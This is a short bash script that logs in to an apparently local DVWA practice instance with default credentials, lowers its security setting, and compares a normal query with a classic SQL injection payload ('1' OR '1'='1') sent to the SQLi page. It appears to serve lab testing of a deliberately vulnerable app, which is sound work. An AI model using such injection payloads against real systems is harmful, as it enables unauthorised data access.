#!/bin/bash

# Get session
PHPSESSID=$(curl -s -c - -d 'username=admin&password=password&Login=Login' http://localhost:8080/login.php | grep PHPSESSID | awk '{print $7}')
echo "PHPSESSID: $PHPSESSID"

# Set security low
curl -s -b "PHPSESSID=$PHPSESSID" -d 'security=low&seclev_submit=Submit' http://localhost:8080/security.php > /dev/null

echo ""
echo "Test 1: Normal query (id=1)"
curl -s -b "PHPSESSID=$PHPSESSID; security=low" 'http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit' | grep "First name:" | head -3

echo ""
echo "Test 2: SQLi payload (id=1' OR '1'='1)"
curl -s -b "PHPSESSID=$PHPSESSID; security=low" "http://localhost:8080/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit" | grep "First name:" | head -5
